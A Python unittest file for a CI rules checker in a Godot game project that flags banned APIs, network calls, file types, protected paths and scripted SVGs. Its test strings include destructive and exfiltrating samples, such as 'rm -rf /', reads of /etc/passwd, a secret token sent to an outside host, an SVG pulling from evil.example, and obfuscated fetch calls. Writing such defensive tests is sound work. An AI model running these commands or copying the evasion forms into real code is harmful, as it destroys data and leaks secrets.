"""Tests for the hard rules check. Run: python3 -m unittest discover -s ci/tests -t ci"""

from __future__ import annotations

import os
import shutil
import subprocess
import tempfile
import unittest
from pathlib import Path

from smbot import config, rules

ROOT = Path(__file__).resolve().parents[2]
PNG = b"\x89PNG\r\n\x1a\n" + b"\0" * 32
OGG = b"OggS" + b"\0" * 32
CFG = config.load()
CONTRIBUTOR, BOT, OWNER = "someone", CFG.bot.login, CFG.owner.login


def banned(text: str, path: str = "content/spells/x.gd") -> list[str]:
    return [f.message for f in rules.check_banned_apis(path, text)]


class BannedApiTest(unittest.TestCase):
    def test_flags_dangerous_calls(self) -> None:
        for code in [
            'OS.execute("rm", [])',
            'OS.shell_open("https://example.com")',
            "OS . create_process('x', [])",
            'OS.call("execute", "x")',
            'Engine.get_singleton("OS")',
            "var r := HTTPRequest.new()",
            "var p := StreamPeerTCP.new()",
            "IP.resolve_hostname('x')",
            'JavaScriptBridge.eval("alert(1)")',
            "var s := GDScript.new()",
            "s.source_code = src",
            "var e := Expression.new()",
            "node.set_script(s)",
            'ClassDB.instantiate("HTTPRequest")',
            "@tool",
            "extends EditorPlugin",
            'FileAccess.open("res://x.json", FileAccess.READ)',
            "FileAccess.open(path, FileAccess.WRITE)",
            'DirAccess.remove_absolute("/home")',
            "cfg.load(path)",
            "var scene = load(path)",
            'load("user://evil.gd")',
            "ResourceLoader.load(p)",
            'var v = str_to_var(text)',
            'GDExtensionManager.load_extension("res://x.gdextension")',
        ]:
            with self.subTest(code=code):
                self.assertTrue(banned(code), f"not flagged: {code}")

    def test_allows_normal_code(self) -> None:
        for code in [
            'const SCENE := preload("res://content/enemies/slime/slime.tscn")',
            'var tex: Texture2D = load("res://art/ui/icon.png")',
            'ResourceLoader.load("res://content/spells/forms/bolt.tres")',
            'var f := FileAccess.open("user://save.json", FileAccess.WRITE)',
            'cfg.load("user://settings.cfg")',
            'image.save_png("user://shot.png")',
            "# Expression of joy when the spell lands; no JavaScript here",
            "var os_name := OS.get_name()",
            "func reload_spell() -> void:",
            "var ip_count: int = 0",
        ]:
            with self.subTest(code=code):
                self.assertEqual(banned(code), [], f"wrongly flagged: {code}")

    def test_core_and_tests_may_load_dynamically_but_not_execute(self) -> None:
        for path in ("core/registry/registry.gd", "tests/smoke/boot_smoke.gd"):
            self.assertEqual(banned("var res = load(path)", path), [])
            self.assertTrue(banned('OS.execute("x", [])', path))

    def test_the_native_loader_may_make_the_modules_classes_only(self) -> None:
        good = 'static func shot_kernel() -> Object:\n\treturn ClassDB.instantiate(&"ShotKernel")\n'
        self.assertEqual(banned(good, rules.NATIVE_FILE), [])
        self.assertTrue(banned(good, "core/spells/x.gd"))
        self.assertTrue(banned(good.replace("ShotKernel", "HTTPRequest"), rules.NATIVE_FILE))
        self.assertTrue(banned('ClassDB.instantiate(name)', rules.NATIVE_FILE))
        self.assertTrue(banned(good + 'var x := Expression.new()\n', rules.NATIVE_FILE))

    def test_tool_scripts_only_in_claudes_folders(self) -> None:
        # The owner's decision of 2026-11-11: @tool is allowed where contributors cannot write.
        for path in ("tools/prop_stand_in.gd", "core/base/prop_base.gd"):
            self.assertEqual(banned("@tool\nclass_name X\nextends Node2D\n", path), [], path)
            self.assertTrue(banned("extends EditorPlugin\n", path), f"an editor plugin in {path}")
        for path in ("content/props/x/x.gd", "gameplay/actor/x.gd", "hud/x.gd", "net/x.gd", "tests/x.gd"):
            self.assertTrue(banned("@tool\nextends Node2D\n", path), f"not flagged: {path}")

    def test_only_the_netcode_may_name_its_networking_classes(self) -> None:
        link = "var peer := WebRTCPeerConnection.new()\nvar channel: WebRTCDataChannel = null\nvar ws := WebSocketPeer.new()\n"
        self.assertEqual(banned(link, "net/net_webrtc.gd"), [])
        for path in ("core/sim/frames.gd", "gameplay/coop/coop.gd", "hud/menus/main_menu.gd", "tests/net/test_net_link.gd",
                     "content/relics/a/a.gd", "network/x.gd"):
            with self.subTest(path=path):
                self.assertTrue(banned(link, path), f"not flagged in {path}")
        # Nothing else of the network is allowed there, and no other ban is lifted.
        for bad in ("var http := HTTPRequest.new()", "var tcp := StreamPeerTCP.new()", "var s := TCPServer.new()",
                    "var ws := WebSocketMultiplayerPeer.new()", "var p := PacketPeerUDP.new()", "var a := IP.get_local_addresses()",
                    "var m := WebRTCMultiplayerPeer.new()", "var e := WebRTCPeerConnectionExtension.new()",
                    "var c: WebRTCDataChannelExtension = null", "var api: SceneMultiplayer = null",
                    "var peer: MultiplayerPeer = null", '@rpc("any_peer")\nfunc hit() -> void:\n\tpass', 'OS.shell_open("https://example.com")',
                    "JavaScriptBridge.eval(code)", 'var f := FileAccess.open("/etc/passwd", FileAccess.READ)',
                    "var x: Variant = bytes_to_var_with_objects(bytes)"):
            with self.subTest(code=bad):
                self.assertTrue(banned(bad, "net/net_webrtc.gd"), f"not flagged in net/: {bad}")

    def test_the_room_server_imports_its_own_and_calls_nothing_else(self) -> None:
        def signal(text: str, path: str = "server/signal/worker.js") -> list[str]:
            return [f.message for f in rules.check_signal_source(path, text)]

        good = ('import { DurableObject } from "cloudflare:workers";\nimport { Rooms } from "./rooms.js";\n'
                'import { createHash } from "node:crypto";\nimport { createServer } from "node:http";\n'
                "export default {\n  async fetch(request, env) {\n    return env.ROOMS.get(id).fetch(request);\n  },\n};\n"
                "export class R extends DurableObject {\n  async fetch() {\n    return new Response(null);\n  }\n}\n")
        self.assertEqual(signal(good), [])
        tests = ('import assert from "node:assert/strict";\nimport { test } from "node:test";\nimport { listen } from "../local.js";\n'
                 'const r = await fetch("http://127.0.0.1:1/room");\n')
        self.assertEqual(signal(tests, "server/signal/test/local.test.js"), [])
        self.assertTrue(signal(tests), "a test's imports and its fetch are the tests' only")
        for bad in ('import fs from "node:fs";', 'import { exec } from "node:child_process";', 'import x from "left-pad";',
                    'import "https://example.com/x.js";', 'import { a } from "../../../ci/x.js";', 'import x from "./data.json";',
                    'const m = await import("./rooms.js");', 'const fs = require("node:fs");', 'eval("1");',
                    'const f = new Function("return 1");', 'await fetch("https://example.com");', 'const r = fetch(url);',
                    'const key = process.env.SECRET;', 'const s = connect({ hostname: "example.com", port: 25 });',
                    'export { x } from "node:net";', 'globalThis["fet" + "ch"](url);', "self.fetch(url);"):
            with self.subTest(code=bad):
                self.assertTrue(signal(good + bad + "\n"), f"not flagged: {bad}")
                self.assertTrue(signal(bad + "\n", "server/signal/test/rooms.test.js") or "fetch" in bad, f"not flagged in a test: {bad}")

    def test_the_room_server_calls_cloudflares_turn_service_once_and_only_so(self) -> None:
        def signal(text: str, path: str = "server/signal/worker.js") -> list[str]:
            return [f.message for f in rules.check_signal_source(path, text)]

        relay = "const r = await " + rules.SIGNAL_RELAY_FETCH + ' method: "POST" });\n'
        self.assertEqual(signal(relay), [], "the relay call in worker.js")
        self.assertTrue(signal(relay, "server/signal/rooms.js"), "only in worker.js")
        self.assertTrue(signal(relay, "server/signal/local.js"), "not in the local server")
        self.assertEqual(len(signal(relay + relay)), 1, "once: a second is flagged")
        self.assertTrue(signal(relay + 'await fetch("https://example.com");\n'), "and no other beside it")
        # The global fetch is not called, named, kept or handed on in any other way, and there is
        # no other way out.
        for bad in ('const f = fetch;\nf("https://example.com");', 'fetch.call(null, "https://example.com");',
                    '(fetch)("https://example.com");', '(0, fetch)("https://example.com");', '[fetch][0]("https://example.com");',
                    'fetch/**/("https://example.com");', 'fetch ("https://example.com");', 'const o = { fetch };',
                    'new WebSocket("wss://example.com/" + env.TURN_KEY_API_TOKEN);', 'new Request("https://example.com");',
                    'new EventSource("https://example.com");', 'navigator.sendBeacon("https://example.com");'):
            for path in ("server/signal/worker.js", "server/signal/rooms.js", "server/signal/turn.js"):
                with self.subTest(code=bad, path=path):
                    self.assertTrue(signal(relay + bad + "\n", path), f"not flagged: {bad}")
        own = "export default {\n  async fetch(request, env) {\n    return env.ROOMS.get(id).fetch(request);\n  },\n};\n"
        self.assertEqual(signal(relay + own), [], "a Worker's own fetch method, defined and called on an object")
        for changed in (rules.SIGNAL_RELAY_FETCH.replace("rtc.live.cloudflare.com", "rtc.live.cloudflare.com.evil.example"),
                        rules.SIGNAL_RELAY_FETCH.replace("env.TURN_KEY_ID", "url"),
                        rules.SIGNAL_RELAY_FETCH.replace("generate-ice-servers", "generate-ice-servers?x=${y}"),
                        rules.SIGNAL_RELAY_FETCH.replace("encodeURIComponent(env.TURN_KEY_ID)", "env.TURN_KEY_ID")):
            with self.subTest(code=changed):
                self.assertTrue(signal("await " + changed + " });\n"), f"not flagged: {changed}")

    def test_native_sources_compute_only(self) -> None:
        def native(text: str) -> list[str]:
            return [f.message for f in rules.check_native_source("native/src/k.cpp", text)]
        good = ('#include "k.h"\n#include <cmath>\n#include <godot_cpp/variant/vector2.hpp>\n'
                '#include <godot_cpp/classes/node2d.hpp>\n#include <godot_cpp/core/class_db.hpp>\n'
                'Object *o = (Object *)::godot::gdextension_interface::object_get_instance_from_id(id);\n'
                'node->set_position(p); double far = std::sqrt(x);\n')
        self.assertEqual(native(good), [])
        for bad in ['#include <godot_cpp/classes/os.hpp>', '#include <godot_cpp/classes/http_request.hpp>',
                    '#include <cstdlib>', '#include "../../secret.h"', 'system("rm -rf /");', 'FILE *f = fopen(p, "r");',
                    'void *h = dlopen("x", 0);', 'obj->call("execute", args);', 'Engine::get_singleton();',
                    'std::thread t(f);', '#include <thread>', '#include <mutex>', 'std::atomic<int> n;',
                    'pthread_create(&t, 0, f, 0);', 'std::async(f);', 'thread_local int n;',
                    'asm("nop");', '::godot::gdextension_interface::classdb_construct_object(n);']:
            with self.subTest(bad=bad):
                self.assertTrue(native(good + bad + "\n"), f"not flagged: {bad}")

    def test_only_the_jobs_file_makes_threads(self) -> None:
        def native(path: str, text: str) -> list[str]:
            return [f.message for f in rules.check_native_source(path, text)]
        pool = ('#include "jobs.h"\n#include <atomic>\n#include <condition_variable>\n#include <mutex>\n'
                '#include <thread>\n#include <vector>\nstd::vector<std::thread> workers; std::mutex lock;\n'
                'std::atomic<int> next{0}; std::condition_variable wake; std::this_thread::yield();\n')
        self.assertEqual(native(rules.NATIVE_THREADS_FILE, pool), [])
        self.assertTrue(native("native/src/shot_kernel.cpp", pool))
        self.assertEqual(native("native/src/shot_kernel.cpp", '#include <vector>\nstd::vector<int> list;\n'), [])
        for bad in ['pthread_create(&t, 0, f, 0);', 'std::async(f);', 'std::jthread t(f);', 'CreateThread(0, 0, f, 0, 0, 0);',
                    '#include <future>', 'system("x");']:
            with self.subTest(bad=bad):
                self.assertTrue(native(rules.NATIVE_THREADS_FILE, pool + bad + "\n"), f"not flagged in the jobs file: {bad}")

    def test_reports_line_numbers(self) -> None:
        found = rules.check_banned_apis("a.gd", 'extends Node\n\nfunc _ready() -> void:\n\tOS.execute("x", [])\n')
        self.assertEqual(found[0].line, 4)


class TypedTest(unittest.TestCase):
    def messages(self, text: str) -> list[str]:
        return [f.message for f in rules.check_typed("a.gd", text, "warning")]

    def test_typed_code_passes(self) -> None:
        code = (
            "var speed: float = 3.0\n"
            "var dir := Vector2.ZERO\n"
            "@onready var sprite: Sprite2D = $Sprite\n"
            "@export_range(0, 10) var level: int = 1\n"
            "static var count: int\n"
            "func move(delta: float, target := Vector2(0, 0)) -> void:\n\tpass\n"
            "func pick(items: Array[int],\n\t\tweights: Dictionary[int, float]) -> Array[int]:\n\treturn items\n"
        )
        self.assertEqual(self.messages(code), [])

    def test_untyped_code_is_reported(self) -> None:
        msgs = self.messages("var speed = 3\nvar target\nfunc hit(amount, source: Node):\n\tpass\n")
        self.assertIn("Variable `speed` has no type.", msgs)
        self.assertIn("Variable `target` has no type.", msgs)
        self.assertIn("Parameter `amount` of `hit()` has no type.", msgs)
        self.assertIn("Function `hit()` has no return type.", msgs)
        self.assertEqual(len(msgs), 4)


class LicenseAndSvgTest(unittest.TestCase):
    def test_license_lines(self) -> None:
        self.assertEqual(rules.check_license("a.gd", "# SPDX-License-Identifier: MIT\n"), [])
        self.assertEqual(rules.check_license("art/a.png.license", "SPDX-License-Identifier: CC0-1.0\n"), [])
        self.assertTrue(rules.check_license("art/a.png.license", "SPDX-License-Identifier: CC-BY-NC-4.0\n"))
        self.assertTrue(rules.check_license("audio/a.ogg.license", "SPDX-License-Identifier: GPL-3.0-or-later\n"))
        self.assertTrue(rules.check_license("a.gd", "# SPDX-License-Identifier: LicenseRef-Proprietary\n"))
        # Mentioning the tag inside code is not a license line.
        self.assertEqual(rules.check_license("a.py", 'x = re.compile(r"SPDX-License-Identifier: (.*)")\n'), [])

    def test_svg_scripts(self) -> None:
        change = rules.Change("A", "art/ui/a.svg", "100644")
        clean = b'<svg xmlns="http://www.w3.org/2000/svg"><rect width="4" height="4"/></svg>'
        self.assertEqual(rules.check_content(change, clean, rules.CONTRIBUTOR), [])
        for bad in [b"<svg><script>alert(1)</script></svg>", b'<svg onload="x()"></svg>',
                    b'<svg><image href="https://evil.example/x.png"/></svg>']:
            self.assertTrue(rules.check_content(change, bad, rules.CONTRIBUTOR), bad)


class RepoTest(unittest.TestCase):
    """End-to-end runs against a throwaway git repo with this repo's policy files."""

    def setUp(self) -> None:
        self.tmp = Path(tempfile.mkdtemp())
        self.addCleanup(shutil.rmtree, self.tmp)
        self.git("init", "-q", "-b", "main")
        for rel in (".github/CODEOWNERS", "ci/config.json"):
            self.write(rel, (ROOT / rel).read_bytes())
        self.write("core/events/.gitkeep", b"")
        self.commit("base")
        self.git("switch", "-q", "-c", "pr")
        # In CI the policy files come from a separate checkout of the base branch.
        self.trusted = Path(tempfile.mkdtemp())
        self.addCleanup(shutil.rmtree, self.trusted)
        for rel in (".github/CODEOWNERS", "ci/config.json"):
            (self.trusted / rel).parent.mkdir(parents=True, exist_ok=True)
            shutil.copy(self.tmp / rel, self.trusted / rel)

    def git(self, *args: str) -> None:
        env = {**os.environ, "GIT_AUTHOR_NAME": "t", "GIT_AUTHOR_EMAIL": "t@t", "GIT_COMMITTER_NAME": "t",
               "GIT_COMMITTER_EMAIL": "t@t"}
        subprocess.run(["git", "-C", str(self.tmp), *args], check=True, capture_output=True, env=env)

    def write(self, rel: str, data: bytes | str) -> None:
        path = self.tmp / rel
        path.parent.mkdir(parents=True, exist_ok=True)
        path.write_bytes(data.encode() if isinstance(data, str) else data)

    def commit(self, msg: str = "change") -> None:
        self.git("add", "-A")
        self.git("commit", "-q", "-m", msg)

    def check(self, author: str = CONTRIBUTOR, worktree: bool = False) -> list[tuple[str, str, str]]:
        found = rules.run(self.tmp, self.trusted, "main", author, worktree)
        return [(f.rule, f.severity, f.path) for f in found]

    def test_clean_contribution_passes(self) -> None:
        self.write("content/spells/forms/bolt/bolt.gd", "extends Node\n\nfunc cast(power: float) -> void:\n\tpass\n")
        self.write("content/spells/forms/bolt/icon.png", PNG)
        self.write("content/spells/forms/bolt/cast.ogg", OGG)
        self.write("content/spells/forms/bolt/bolt.tres", '[gd_resource type="Resource" format=3]\n')
        self.commit()
        self.assertEqual(self.check(), [])

    def test_path_tiers(self) -> None:
        self.write(".github/workflows/x.yml", "on: push\n")
        self.write("core/events/bus.gd", "extends Node\n")
        self.write("docs/NEXT.md", "# Next\n")
        self.commit()
        found = self.check()
        self.assertIn(("protected-path", "error", ".github/workflows/x.yml"), found)
        self.assertIn(("bot-path", "error", "core/events/bus.gd"), found)
        self.assertIn(("bot-path", "error", "docs/NEXT.md"), found)

    def test_bot_may_change_bot_paths_but_not_owner_paths(self) -> None:
        self.write("core/events/bus.gd", "extends Node\n")
        self.write("docs/NEXT.md", "# Next\n")
        self.write("ci/evil.py", "print()\n")
        self.commit()
        found = self.check(BOT)
        self.assertEqual([f for f in found if f[2] != "ci/evil.py"], [])
        self.assertIn(("protected-path", "error", "ci/evil.py"), found)

    def test_the_last_matching_codeowners_line_wins(self) -> None:
        entries = rules.owner_only_patterns(f"/.github/  @{OWNER}\n/.github/ISSUE_TEMPLATE/\n", OWNER)
        self.assertTrue(rules.is_owner_only(".github/workflows/x.yml", entries))
        self.assertFalse(rules.is_owner_only(".github/ISSUE_TEMPLATE/bug.yml", entries))
        self.assertFalse(rules.is_owner_only("docs/NEXT.md", entries))

    def test_the_bot_keeps_the_design_the_forms_and_contributing(self) -> None:
        self.write("docs/DESIGN.md", "# Design\n")
        self.write("CONTRIBUTING.md", "# Contributing\n")
        self.write(".github/ISSUE_TEMPLATE/idea.yml", 'name: Idea\nlabels: ["idea"]\nbody: []\n')
        self.commit()
        self.assertEqual(self.check(BOT), [])
        found = self.check(CONTRIBUTOR)
        for path in ("docs/DESIGN.md", "CONTRIBUTING.md", ".github/ISSUE_TEMPLATE/idea.yml"):
            self.assertIn(("bot-path", "error", path), found)

    def test_issue_forms_may_only_add_the_plain_labels(self) -> None:
        form = rules.ISSUE_FORMS + "x.yml"
        self.assertEqual(rules.check_issue_form(form, 'name: X\nlabels: ["bug", "idea"]\nbody:\n  - type: textarea\n'), [])
        for bad in ('labels: ["bug", "scheduled"]', 'labels: [p0]', "assignees: [someone]", "labels:\n  - scheduled"):
            with self.subTest(bad=bad):
                self.assertTrue(rules.check_issue_form(form, f"name: X\n{bad}\nbody: []\n"))

    def test_deleting_protected_files_is_a_change_too(self) -> None:
        self.git("rm", "-q", ".github/CODEOWNERS")
        self.commit()
        self.assertIn(("protected-path", "error", ".github/CODEOWNERS"), self.check())

    def test_policy_comes_from_trusted_checkout(self) -> None:
        # The PR empties CODEOWNERS and edits a workflow in the same change.
        self.write(".github/CODEOWNERS", "")
        self.write(".github/workflows/x.yml", "on: push\n")
        self.commit()
        self.assertIn(("protected-path", "error", ".github/workflows/x.yml"), self.check())

    def test_file_types_binaries_and_sizes(self) -> None:
        self.write("content/relics/a/tool.exe", b"MZ\0\0")
        self.write("content/relics/a/fake.png", b"MZ\0\0not a png")
        self.write("content/relics/a/data.json", b'{"a": 1}\0\0')
        self.write("audio/music/long.ogg", OGG + b"\0" * 5_000_001)
        self.write("content/relics/a/a.gdextension", "[configuration]\n")
        self.commit()
        found = self.check()
        self.assertIn(("file-type", "error", "content/relics/a/tool.exe"), found)
        self.assertIn(("binary", "error", "content/relics/a/fake.png"), found)
        self.assertIn(("binary", "error", "content/relics/a/data.json"), found)
        self.assertIn(("file-size", "error", "audio/music/long.ogg"), found)
        self.assertIn(("file-type", "error", "content/relics/a/a.gdextension"), found)

    def test_native_sources_are_claudes_only(self) -> None:
        self.write("native/src/shot_kernel.cpp", "int x = 1;\n")
        self.write("native/src/shot_kernel.h", "#pragma once\n")
        self.commit()
        self.assertEqual(self.check(BOT), [])
        found = self.check()
        for path in ("native/src/shot_kernel.cpp", "native/src/shot_kernel.h"):
            self.assertIn(("bot-path", "error", path), found)
            self.assertIn(("file-type", "error", path), found)

    def test_the_netcode_is_claudes_only(self) -> None:
        self.write("net/net_link.gd", "class_name NetLink\nextends RefCounted\n")
        self.commit()
        self.assertEqual(self.check(BOT), [])
        self.assertIn(("bot-path", "error", "net/net_link.gd"), self.check())

    def test_the_room_server_is_claudes_only_and_only_there(self) -> None:
        self.write("server/signal/rooms.js", "export const A = 1;\n")
        self.write("server/signal/wrangler.toml", 'name = "spellmerge-signal"\n')
        self.write("server/signal/package.json", '{"private": true}\n')
        self.commit()
        self.assertEqual(self.check(BOT), [])
        found = self.check()
        for path in ("server/signal/rooms.js", "server/signal/wrangler.toml"):
            self.assertIn(("bot-path", "error", path), found)
            self.assertIn(("file-type", "error", path), found)
        self.assertIn(("bot-path", "error", "server/signal/package.json"), found)
        self.write("core/sim/helper.js", "export const A = 1;\n")
        self.write("server/other/worker.js", "export const A = 1;\n")
        self.write("net/wrangler.toml", 'name = "x"\n')
        self.write("server/signal/node_modules/x/index.mjs", "export const A = 1;\n")
        self.write("server/signal/build.sh", "#!/bin/sh\n")
        self.commit()
        found = self.check(BOT)
        for path in ("core/sim/helper.js", "server/other/worker.js", "net/wrangler.toml",
                     "server/signal/node_modules/x/index.mjs", "server/signal/build.sh"):
            self.assertIn(("file-type", "error", path), found)

    def test_the_native_build_is_the_owners(self) -> None:
        # Its SCons script runs in the job that builds the game; its profile says what the C++ reaches.
        self.write("native/SConstruct", "Default([])\n")
        self.write("native/build_profile.json", '{"enabled_classes": ["OS"]}\n')
        self.commit()
        found = self.check(BOT)
        for path in ("native/SConstruct", "native/build_profile.json"):
            self.assertIn(("protected-path", "error", path), found)

    def test_native_types_only_in_native(self) -> None:
        self.write("core/spells/fast.cpp", "int x = 1;\n")
        self.write("native/bin/libspellmerge.so", b"\x7fELF\0\0\0\0")
        self.commit()
        found = self.check(BOT)
        self.assertIn(("file-type", "error", "core/spells/fast.cpp"), found)
        self.assertIn(("binary", "error", "native/bin/libspellmerge.so"), found)

    def test_godot_shaders_and_shader_includes_are_allowed(self) -> None:
        # The shot shaders share code through includes (the owner, 2026-10-29).
        self.write("content/relics/a/glow.gdshader", "shader_type canvas_item;\n#include \"res://content/relics/a/glow.gdshaderinc\"\n")
        self.write("content/relics/a/glow.gdshaderinc", "const float GLOW = 1.0;\n")
        self.write("content/relics/a/glow.gdshaderinc.uid", "uid://b1234567890ab\n")
        self.commit()
        found = [f for f in self.check() if f[0] == "file-type"]
        self.assertEqual(found, [])

    def test_symlinks_are_rejected(self) -> None:
        (self.tmp / "content").mkdir()
        os.symlink("/etc/passwd", self.tmp / "content/link.json")
        self.commit()
        self.assertIn(("symlink", "error", "content/link.json"), self.check())

    def test_untyped_is_warning_for_contributors_and_error_for_bot(self) -> None:
        self.write("content/relics/a/a.gd", "var x = 1\n")
        self.commit()
        self.assertEqual(self.check(), [("untyped", "warning", "content/relics/a/a.gd")])
        self.assertEqual(self.check(BOT), [("untyped", "error", "content/relics/a/a.gd")])

    def test_owner_findings_are_only_warnings(self) -> None:
        self.write(".github/workflows/x.yml", "on: push\n")
        self.write("addons/steam/steam.gd", 'extends Node\nfunc a() -> void:\n\tOS.execute("x", [])\n')
        self.commit()
        found = self.check(OWNER)
        self.assertEqual([f[1] for f in found], ["warning"])

    def test_dependabot_may_only_touch_workflows(self) -> None:
        self.write(".github/workflows/x.yml", "uses: actions/checkout@abc\n")
        self.commit()
        self.assertEqual(self.check("dependabot[bot]"), [])
        self.write("content/x.gd", "extends Node\n")
        self.commit()
        self.assertEqual(self.check("dependabot[bot]"), [("dependency-bot", "error", "content/x.gd")])

    def test_unreadable_untracked_file_is_a_warning_not_a_crash(self) -> None:
        self.write("content/relics/a/locked.json", b"{}")
        os.chmod(self.tmp / "content/relics/a/locked.json", 0)
        self.addCleanup(os.chmod, self.tmp / "content/relics/a/locked.json", 0o644)
        if os.access(self.tmp / "content/relics/a/locked.json", os.R_OK):
            self.skipTest("running as root")
        self.assertEqual(self.check(worktree=True), [("unreadable", "warning", "content/relics/a/locked.json")])

    def test_links_file_may_open_only_its_own_table(self) -> None:
        good = (f'extends Node\n\nconst URLS := {{\n\t"feedback": "https://github.com/{CFG.repo}/discussions",\n'
                f'\t"contribute": "{CFG.pages}/contribute/",\n}}\n\n'
                'func open(key: String) -> void:\n\tif URLS.has(key):\n\t\tOS.shell_open(URLS[key])\n')
        self.assertEqual(banned(good, rules.LINKS_FILE), [])
        self.assertTrue(banned(good, "core/menu/menu.gd"))  # anywhere else it stays banned
        self.assertTrue(banned(good.replace("OS.shell_open(URLS[key])", "OS.shell_open(key)"), rules.LINKS_FILE))
        self.assertTrue(banned(good.replace(f"{CFG.pages}/contribute/", "https://evil.example/x"), rules.LINKS_FILE))
        self.assertTrue(banned(good + f'\nfunc x() -> void:\n\tURLS["a"] = "https://github.com/{CFG.repo}"\n',
                               rules.LINKS_FILE))
        self.assertTrue(banned(good.replace("const URLS", "var URLS"), rules.LINKS_FILE))
        self.assertTrue(banned(good + '\nfunc y() -> void:\n\tOS.execute("sh", [])\n', rules.LINKS_FILE))

    def test_worktree_includes_untracked_files(self) -> None:
        self.write("content/relics/a/tool.exe", b"MZ")
        self.assertEqual(self.check(worktree=False), [])
        self.assertIn(("file-type", "error", "content/relics/a/tool.exe"), self.check(worktree=True))


    def test_sandbox_placeholders_are_skipped_but_real_files_are_not(self) -> None:
        for name in (".bashrc", ".zshrc", ".gitconfig", ".idea/workspace.xml", ".claude/commands/x.md"):
            self.write(name, b"")
        self.assertEqual(self.check(worktree=True), [])
        self.write(".bashrc", "alias x=y\n")  # not empty: someone wrote it, so it's checked
        self.write("scripts/gen.py", "print(1)\n")
        found = self.check(worktree=True)
        self.assertIn(("file-type", "error", ".bashrc"), found)
        self.assertIn(("file-type", "error", "scripts/gen.py"), found)


if __name__ == "__main__":
    unittest.main()
